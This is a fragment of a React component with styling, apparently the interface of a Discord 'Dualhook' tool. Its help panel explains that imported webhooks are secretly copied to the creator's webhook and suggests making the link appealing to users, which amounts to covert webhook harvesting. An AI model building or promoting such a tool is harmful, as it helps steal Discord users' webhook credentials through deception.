            className="flex items-center justify-between p-3 cursor-pointer bg-gradient-to-r from-gray-900 to-black hover:from-purple-950/30 hover:to-black transition-colors"
            onClick={() => setShowHelp(!showHelp)}
          >
            <div className="flex items-center gap-2">
              <HelpCircle className="w-4 h-4 text-purple-400 flex-shrink-0" />
              <h3 className="font-medium text-white text-sm">What is a Dualhook?</h3>
            </div>
            <div>
              {showHelp ? (
                <ChevronUp className="w-4 h-4 text-gray-400" />
              ) : (
                <ChevronDown className="w-4 h-4 text-gray-400" />
              )}
            </div>
          </div>

          <AnimatePresence>
            {showHelp && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: "auto" }}
                exit={{ opacity: 0, height: 0 }}
                transition={{ duration: 0.3 }}
                className="p-3 border-t border-gray-800"
              >
                <p className="text-sm text-gray-300 leading-relaxed">
                  A dualhook is a special link that forwards all imported webhooks to your own webhook. When users
                  import webhooks through your dualhook link, you'll receive a copy of all the webhooks they import,
                  creating a continuous chain of webhook collection.
                </p>
                <div className="mt-3 flex items-center gap-2 p-3 bg-purple-950/20 rounded-lg border border-purple-500/20">
                  <Zap className="w-4 h-4 text-purple-400" />
                  <p className="text-sm text-gray-300">
                    Create your own dualhook by entering your webhook URL and customizing the appearance to make it more
                    appealing to users.
                  </p>
                </div>
                <div className="mt-2 flex items-center gap-2 p-3 bg-purple-950/20 rounded-lg border border-purple-500/20">
                  <Shield className="w-4 h-4 text-purple-400" />
                  <p className="text-sm text-gray-300">
                    This tool is for educational purposes only. Misuse of webhooks may violate Discord's Terms of
                    Service.
                  </p>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.div>
      </motion.div>

      <style jsx global>{`
        @keyframes shine {
          0% {
            transform: translateX(-100%) rotate(15deg);
          }
          20% {
            transform: translateX(100%) rotate(15deg);
          }
          100% {
            transform: translateX(100%) rotate(15deg);
          }
        }

        .shine-animation {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: linear-gradient(
            to right,
            transparent 0%,
            rgba(255, 255, 255, 0.1) 50%,
            transparent 100%
          );
          transform: translateX(-100%) rotate(15deg);
          transition: none;
        }

        .purple-glow {
          text-shadow: 0 0 10px rgba(139, 92, 246, 0.7), 0 0 20px rgba(139, 92, 246, 0.5), 0 0 30px rgba(139, 92, 246, 0.3);
        }

        .purple-glow-container {
          box-shadow: 0 0 15px rgba(139, 92, 246, 0.3);
          animation: purple-container-pulse 4s infinite alternate;
        }

        @keyframes purple-container-pulse {
          0% {
            box-shadow: 0 0 15px rgba(139, 92, 246, 0.3);
          }
          100% {
            box-shadow: 0 0 25px rgba(139, 92, 246, 0.5);
          }
        }
        
        .custom-scrollbar::-webkit-scrollbar {
          width: 4px;
          height: 4px;
        }
        
        .custom-scrollbar::-webkit-scrollbar-track {
          background: rgba(0, 0, 0, 0.2);
          border-radius: 10px;
        }
        
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: rgba(139, 92, 246, 0.5);
          border-radius: 10px;
        }
        
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: rgba(139, 92, 246, 0.7);
        }

        /* Button styles to match the main site */
        button {
          position: relative;
          overflow: hidden;
          transition: all 0.3s ease;
        }

        button:not(:disabled):hover {
          transform: translateY(-2px);
          box-shadow: 0 0 20px rgba(139, 92, 246, 0.4);
        }

        button::before {
          content: "";
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: radial-gradient(circle at center, rgba(139, 92, 246, 0.3) 0%, transparent 70%);
          opacity: 0;
          transition: opacity 0.3s ease;
          z-index: -1;
        }

        button:not(:disabled):hover::before {
          opacity: 1;
        }

        /* Improve focus styles for better accessibility */
        *:focus-visible {
          outline: 2px solid rgba(139, 92, 246, 0.6);
          outline-offset: 2px;
        }
        
        /* Smooth transitions for all interactive elements */
        button, a, input, textarea, select {
          transition: all 0.2s ease;
        }
        
        /* Mobile optimizations */
        @media (max-width: 640px) {
          .purple-glow-container {
            box-shadow: 0 0 10px rgba(139, 92, 246, 0.2);
          }
          
          input, textarea, select, button {
            font-size: 0.75rem !important;
          }
          
          .custom-scrollbar::-webkit-scrollbar {
            width: 3px;
            height: 3px;
          }
          
          /* Improve touch targets */
          button, 
          input[type="checkbox"], 
          input[type="radio"],
          label {
            min-height: 32px;
            min-width: 32px;
          }
        }
      `}</style>
    </div>
  )
}
